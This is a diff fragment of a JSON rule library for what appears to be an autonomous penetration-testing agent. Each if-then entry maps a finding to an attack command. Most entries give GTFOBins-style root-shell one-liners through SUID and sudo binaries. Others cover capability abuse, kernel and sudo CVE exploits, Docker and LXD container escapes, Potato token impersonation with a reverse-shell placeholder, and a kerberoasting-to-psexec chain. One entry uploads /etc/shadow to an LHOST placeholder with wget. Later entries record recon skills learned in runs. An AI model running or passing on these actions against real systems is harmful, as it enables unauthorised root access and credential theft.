+      "then_action": "perl -e 'exec \"/bin/bash\"'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.946079,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_ruby": {
+      "id": "linux_suid_ruby",
+      "if_condition": "SUID binary found: ruby",
+      "then_action": "ruby -e 'exec \"/bin/bash\"'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9542756,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_php": {
+      "id": "linux_suid_php",
+      "if_condition": "SUID binary found: php",
+      "then_action": "php -r 'exec(\"/bin/bash -p\")'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9630592,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_env": {
+      "id": "linux_suid_env",
+      "if_condition": "SUID binary found: env",
+      "then_action": "env /bin/bash -p",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9728882,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_cp": {
+      "id": "linux_suid_cp",
+      "if_condition": "SUID binary found: cp",
+      "then_action": "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.981466,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_pkexec": {
+      "id": "linux_suid_pkexec",
+      "if_condition": "SUID binary found: pkexec",
+      "then_action": "CVE-2021-4034 PwnKit",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9905677,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_systemctl": {
+      "id": "linux_suid_systemctl",
+      "if_condition": "SUID binary found: systemctl",
+      "then_action": "systemctl \u2192 !sh (through pager)",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.000552,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_openssl": {
+      "id": "linux_suid_openssl",
+      "if_condition": "SUID binary found: openssl",
+      "then_action": "openssl req -x509 -newkey rsa:4096 -keyout /dev/null -out /dev/null -nodes -subj '/CN=a' -engine ./lib.so",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.0090334,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_ALL": {
+      "id": "linux_sudo_ALL",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: ALL",
+      "then_action": "sudo su OR sudo bash",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.0188556,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_vi_vim": {
+      "id": "linux_sudo_vi_vim",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: vi/vim",
+      "then_action": "sudo vi \u2192 :!/bin/bash",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.0271697,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_less_more": {
+      "id": "linux_sudo_less_more",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: less/more",
+      "then_action": "sudo less /etc/passwd \u2192 !bash",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.0366678,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_man": {
+      "id": "linux_sudo_man",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: man",
+      "then_action": "sudo man man \u2192 !bash",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.0459018,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_awk": {
+      "id": "linux_sudo_awk",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: awk",
+      "then_action": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.0557337,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_tar": {
+      "id": "linux_sudo_tar",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: tar",
+      "then_action": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.0648928,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_zip": {
+      "id": "linux_sudo_zip",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: zip",
+      "then_action": "sudo zip /tmp/x.zip /tmp/x -T --unzip-command='bash -c bash'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.07355,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_docker": {
+      "id": "linux_sudo_docker",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: docker",
+      "then_action": "sudo docker run -v /:/host -it alpine chroot /host bash",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.081648,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_pip": {
+      "id": "linux_sudo_pip",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: pip",
+      "then_action": "sudo pip install . (setup.py with os.system)",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.0910864,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_wget": {
+      "id": "linux_sudo_wget",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: wget",
+      "then_action": "sudo wget --post-file=/etc/shadow http://LHOST/",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.099819,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_apache2": {
+      "id": "linux_sudo_apache2",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: apache2",
+      "then_action": "sudo apache2 -f /etc/shadow (error reveals content)",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.109751,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_mysql": {
+      "id": "linux_sudo_mysql",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: mysql",
+      "then_action": "sudo mysql -e '\\! bash'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.118477,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_knife": {
+      "id": "linux_sudo_knife",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: knife",
+      "then_action": "sudo knife exec -E 'exec \"/bin/bash\"'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.1275384,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_sudo_journalctl": {
+      "id": "linux_sudo_journalctl",
+      "if_condition": "sudo -l shows: (root) NOPASSWD: journalctl",
+      "then_action": "sudo journalctl \u2192 !bash (if terminal small enough)",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203865.1367035,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_cap_cap_setuid": {
+      "id": "linux_cap_cap_setuid",
+      "if_condition": "Binary with cap_setuid capability found",
+      "then_action": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "capability_abuse"
+      ],
+      "created_at": 1771203865.1458423,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_cap_cap_dac_read_search": {
+      "id": "linux_cap_cap_dac_read_search",
+      "if_condition": "Binary with cap_dac_read_search capability found",
+      "then_action": "Read any file: tar czf /tmp/shadow.tar.gz /etc/shadow",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "capability_abuse"
+      ],
+      "created_at": 1771203865.155427,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_cap_cap_net_raw": {
+      "id": "linux_cap_cap_net_raw",
+      "if_condition": "Binary with cap_net_raw capability found",
+      "then_action": "Packet sniffing: tcpdump -i any -w /tmp/capture.pcap",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "capability_abuse"
+      ],
+      "created_at": 1771203865.16435,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_cap_cap_sys_admin": {
+      "id": "linux_cap_cap_sys_admin",
+      "if_condition": "Binary with cap_sys_admin capability found",
+      "then_action": "Mount filesystems: mount -o bind /etc/shadow /tmp/shadow",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "capability_abuse"
+      ],
+      "created_at": 1771203865.1737533,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_cap_cap_sys_ptrace": {
+      "id": "linux_cap_cap_sys_ptrace",
+      "if_condition": "Binary with cap_sys_ptrace capability found",
+      "then_action": "Inject into root processes",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "capability_abuse"
+      ],
+      "created_at": 1771203865.1830268,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_kernel_dirtycow": {
+      "id": "linux_kernel_dirtycow",
+      "if_condition": "Kernel version vulnerable to DirtyCow (Linux < 4.8.3 (write to read-only memory))",
+      "then_action": "Use DirtyCow exploit: CVE-2016-5195 \u2014 Linux < 4.8.3 (write to read-only memory)",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "kernel_exploits"
+      ],
+      "created_at": 1771203865.1923053,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_kernel_dirtypipe": {
+      "id": "linux_kernel_dirtypipe",
+      "if_condition": "Kernel version vulnerable to DirtyPipe (Linux 5.8-5.16.11 (overwrite read-only files))",
+      "then_action": "Use DirtyPipe exploit: CVE-2022-0847 \u2014 Linux 5.8-5.16.11 (overwrite read-only files)",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "kernel_exploits"
+      ],
+      "created_at": 1771203865.2020178,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_kernel_pwnkit": {
+      "id": "linux_kernel_pwnkit",
+      "if_condition": "Kernel version vulnerable to PwnKit (polkit pkexec (almost all Linux))",
+      "then_action": "Use PwnKit exploit: CVE-2021-4034 \u2014 polkit pkexec (almost all Linux)",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "kernel_exploits"
+      ],
+      "created_at": 1771203865.2120776,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_kernel_baron_samedit": {
+      "id": "linux_kernel_baron_samedit",
+      "if_condition": "Kernel version vulnerable to Baron_Samedit (sudo < 1.9.5p2 (heap overflow))",
+      "then_action": "Use Baron_Samedit exploit: CVE-2021-3156 \u2014 sudo < 1.9.5p2 (heap overflow)",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "kernel_exploits"
+      ],
+      "created_at": 1771203865.2226746,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_kernel_overlayfs": {
+      "id": "linux_kernel_overlayfs",
+      "if_condition": "Kernel version vulnerable to OverlayFS (check version)",
+      "then_action": "Use OverlayFS exploit: CVE-2023-0386 / CVE-2023-2640 / CVE-2023-32629",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "kernel_exploits"
+      ],
+      "created_at": 1771203865.236865,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_kernel_looney_tunables": {
+      "id": "linux_kernel_looney_tunables",
+      "if_condition": "Kernel version vulnerable to Looney_Tunables (glibc ld.so (buffer overflow))",
+      "then_action": "Use Looney_Tunables exploit: CVE-2023-4911 \u2014 glibc ld.so (buffer overflow)",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "kernel_exploits"
+      ],
+      "created_at": 1771203865.24646,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "container_escape_docker_socket": {
+      "id": "container_escape_docker_socket",
+      "if_condition": "Inside container with docker socket available",
+      "then_action": "docker run -v /:/host -it alpine chroot /host bash",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "container_escapes"
+      ],
+      "created_at": 1771203865.255902,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "container_escape_docker_group": {
+      "id": "container_escape_docker_group",
+      "if_condition": "Inside container with docker group available",
+      "then_action": "docker run -v /:/host -it alpine chroot /host bash (if in docker group)",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "container_escapes"
+      ],
+      "created_at": 1771203865.2658885,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "container_escape_privileged_container": {
+      "id": "container_escape_privileged_container",
+      "if_condition": "Inside container with privileged container available",
+      "then_action": "mount host filesystem from within privileged container",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "container_escapes"
+      ],
+      "created_at": 1771203865.2752228,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "container_escape_cgroup_escape": {
+      "id": "container_escape_cgroup_escape",
+      "if_condition": "Inside container with cgroup escape available",
+      "then_action": "Write to release_agent in cgroup v1 \u2192 execute on host",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "container_escapes"
+      ],
+      "created_at": 1771203865.2850754,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "container_escape_lxd_group": {
+      "id": "container_escape_lxd_group",
+      "if_condition": "Inside container with lxd group available",
+      "then_action": "lxd init \u2192 import alpine image \u2192 mount /root \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "container_escapes"
+      ],
+      "created_at": 1771203865.2954013,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "container_escape_runc_escape": {
+      "id": "container_escape_runc_escape",
+      "if_condition": "Inside container with runc escape available",
+      "then_action": "CVE-2019-5736 \u2014 overwrite runc binary through /proc/self/exe",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "container_escapes"
+      ],
+      "created_at": 1771203865.310116,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "windows_token_impersonation": {
+      "id": "windows_token_impersonation",
+      "if_condition": "Windows: whoami /priv shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
+      "then_action": "Use PrintSpoofer, JuicyPotato, GodPotato, or RoguePotato for SYSTEM shell. PrintSpoofer: .\\PrintSpoofer.exe -i -c cmd. JuicyPotato: .\\jp.exe -l 1337 -p cmd.exe -a '/c REVERSE_SHELL' -t *",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "windows_privesc"
+      ],
+      "created_at": 1771203865.338587,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "windows_ad_kerberoasting": {
+      "id": "windows_ad_kerberoasting",
+      "if_condition": "Active Directory environment with domain user credentials",
+      "then_action": "GetUserSPNs.py -dc-ip DC DOMAIN/user:pass \u2192 save TGS hashes \u2192 hashcat -m 13100 hashes.txt wordlist.txt \u2192 crack service account passwords \u2192 psexec.py DOMAIN/svc_account:password@TARGET",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "ad_attacks"
+      ],
+      "created_at": 1771203865.3483124,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_004": {
+      "id": "skill_004",
+      "if_condition": "When reconnaissance yields open HTTP/HTTPS ports with valid responses",
+      "then_action": "Perform directory brute-force plus basic fingerprinting to discover potential web app entry points",
+      "parameters_template": {
+        "port": "80/443",
+        "tools": "gobuster, whatweb"
+      },
+      "confidence": 0.72,
+      "evidence_refs": [
+        "ep001_step07",
+        "ep001_step12"
+      ],
+      "created_at": 1771206967.0984497,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_007": {
+      "id": "skill_007",
+      "if_condition": "When initial credential list partially succeeds but access stalls",
+      "then_action": "Attempt credential reuse combined with session token capture to escalate privileges",
+      "parameters_template": {
+        "creds_file": "creds.txt",
+        "session_capture_tool": "mitmproxy"
+      },
+      "confidence": 0.66,
+      "evidence_refs": [
+        "ep001_step20",
+        "ep001_step23"
+      ],
+      "created_at": 1771206967.0984757,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_ssh_banner_enumeration": {
+      "id": "skill_ssh_banner_enumeration",
+      "if_condition": "When port 22 is open and SSH banner detected",
+      "then_action": "Run SSH enumeration with nmap scripts",
+      "parameters_template": {
+        "port": 22,
+        "script": "ssh-*"
+      },
+      "confidence": 0.85,
+      "evidence_refs": [
+        "ep001_step5",
+        "ep001_step9"
+      ],
+      "created_at": 1771207106.766426,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_http_banner_recon": {
+      "id": "skill_http_banner_recon",
+      "if_condition": "When HTTP service responds with unique banner keywords",
+      "then_action": "Collect headers and run directory brute-force",
+      "parameters_template": {
+        "target": "http",
+        "wordlist": "common_dirs.txt"
+      },
+      "confidence": 0.78,
+      "evidence_refs": [
+        "ep001_step14",
+        "ep001_step18"
+      ],
+      "created_at": 1771207106.7664416,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_http_probe": {
+      "id": "skill_http_probe",
+      "if_condition": "When HTTP service responds with 200 OK",
+      "then_action": "Deploy curl-based probing and directory brute-force",
+      "parameters_template": {
+        "method": "GET",
+        "paths": [
+          "/admin",
+          "/login"
+        ]
+      },
+      "confidence": 0.78,
+      "evidence_refs": [
+        "ep001_step7",
+        "ep001_step11"
+      ],
+      "created_at": 1771208123.212689,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_web_config_enum": {
+      "id": "skill_web_config_enum",
+      "if_condition": "When HTTP service on port 80/443 shows candidate misconfiguration (e.g., directory listing, verbose error message)",
+      "then_action": "Chain directory brute force (gobuster) with vulnerability fingerprinting tool (nikto) and log outputs",
+      "parameters_template": {
+        "ports": [
+          80,
+          443
+        ],
+        "wordlist": "common_dirs.txt"
+      },
+      "confidence": 0.78,
+      "evidence_refs": [
+        "ep001_step05",
+        "ep001_step08"
+      ],
+      "created_at": 1771213527.5671363,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_recon_ssh_banner": {
+      "id": "skill_recon_ssh_banner",
+      "if_condition": "When port 22 is open and an SSH banner is detected",
+      "then_action": "Run targeted SSH enumeration using nmap scripts to capture host keys and version details",
+      "parameters_template": {
+        "port": 22,
+        "script": "ssh-hostkey,ssh-auth-methods"
+      },
+      "confidence": 0.85,
+      "evidence_refs": [
+        "ep001_step04",
+        "ep001_step05"
+      ],
+      "created_at": 1771215038.4138982,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_recon_http": {
+      "id": "skill_recon_http",
+      "if_condition": "When HTTP port (80/443) responds with a page",
+      "then_action": "Launch directory brute force and capture headers for application fingerprinting",
+      "parameters_template": {
+        "tool": "gobuster",
+        "wordlist": "/usr/share/wordlists/common.txt",
+        "extensions": [
+          "php",
+          "html"
+        ]
+      },
+      "confidence": 0.78,
+      "evidence_refs": [
+        "ep001_step06",
+        "ep001_step09"
+      ],
+      "created_at": 1771215038.413907,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_priv_esc_check": {
+      "id": "skill_priv_esc_check",
+      "if_condition": "When privilege escalation attempt is about to run without confirmed credentials/privileges",
+      "then_action": "Pause and run automated credential validation plus sudo checks before executing escalation payloads",
+      "parameters_template": {
+        "verification_commands": [
+          "id",
+          "sudo -l"
+        ],
+        "timeout": 15
+      },
+      "confidence": 0.81,
+      "evidence_refs": [
+        "ep001_step20",
+        "ep001_step27"
+      ],
+      "created_at": 1771217807.755736,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_cred_context": {
+      "id": "skill_cred_context",
+      "if_condition": "When initial recon reveals Windows SMB (port 445) and no valid credentials yet obtained",
+      "then_action": "Switch from brute-force spraying to context-aware enumeration (enum4linux, smbmap) and collect share information",
+      "parameters_template": {
+        "port": 445,
+        "tools": [
+          "enum4linux",
+          "smbmap"
+        ]
+      },
+      "confidence": 0.76,
+      "evidence_refs": [
+        "run_20260216_060046_e13d65_ep1_step12",
+        "run_20260216_060046_e13d65_ep1_step16"
+      ],
+      "created_at": 1771218076.7628696,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_http_scan": {
+      "id": "skill_http_scan",
+      "if_condition": "When port 80 or 443 responds with HTTP banner",
+      "then_action": "Trigger HTTP content discovery and header inspection",
+      "parameters_template": {
+        "tools": [
+          "gobuster",
+          "nikto"
+        ],
+        "timeout": 30
+      },
+      "confidence": 0.78,
+      "evidence_refs": [
+        "ep001_step5",
+        "ep001_step6"
+      ],
+      "created_at": 1771250092.7100837,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_http_banners": {
+      "id": "skill_http_banners",
+      "if_condition": "When port 80 or 443 responds with HTTP status 200",
+      "then_action": "Extract HTTP headers and probe for web server info via curl and nikto",
+      "parameters_template": {
+        "ports": [
+          80,
+          443
+        ],
+        "tools": [
+          "curl -I",
+          "nikto"
+        ]
+      },
+      "confidence": 0.78,
+      "evidence_refs": [
+        "ep001_step05",
+        "ep001_step07"
+      ],
+      "created_at": 1771252511.5640047,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_priv_escalation": {
+      "id": "skill_priv_escalation",
+      "if_condition": "When a low-privilege shell is obtained and sudoers file is accessible",
+      "then_action": "Analyze sudo privileges and test known local exploit paths before pivoting",
+      "parameters_template": {
+        "commands": [
+          "sudo -l",
+          "cat /etc/sudoers",
+          "checksec --file=/bin/bash"
+        ]
+      },
+      "confidence": 0.76,
+      "evidence_refs": [
+        "ep001_step12",
+        "ep001_step18"
+      ],
+      "created_at": 1771252780.7803814,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_http_headers": {
+      "id": "skill_http_headers",
+      "if_condition": "When HTTP 200 response on port 80/443 with static asset indicators",
+      "then_action": "Capture detailed HTTP headers and identify exposed software versions for CVE correlation",
+      "parameters_template": {
+        "ports": [
+          80,
+          443
+        ],
+        "tools": "curl -I, nikto"
+      },
+      "confidence": 0.74,
+      "evidence_refs": [
+        "run_20260216_154147_cd53e4_ep001_step03",
+        "run_20260216_154147_cd53e4_ep001_step06"
+      ],
+      "created_at": 1771252925.1589835,
       "usage_count": 0,
       "success_rate": 0.0
     }
